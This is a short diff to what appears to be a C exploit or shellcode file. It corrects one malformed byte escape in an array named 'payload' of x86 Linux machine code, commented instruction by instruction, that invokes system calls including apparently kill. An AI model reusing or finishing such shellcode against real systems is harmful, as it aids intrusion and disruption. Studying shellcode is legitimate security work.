@@ -54,7 +54,7 @@ unsigned char payload[] =
    "\x58"                   	//pop    %eax
    "\xcd\x80"                	//int    $0x80
    "\x89\xc3"              		//mov    %eax,%ebx
-   "\x6a0x0c"                	//push   $0xc
+   "\x6a\x0c"                	//push   $0xc
    "\x59"                   	//pop    %ecx
    "\x6a\x25"                	//push   $0x25
    "\x58"                   	//pop    %eax
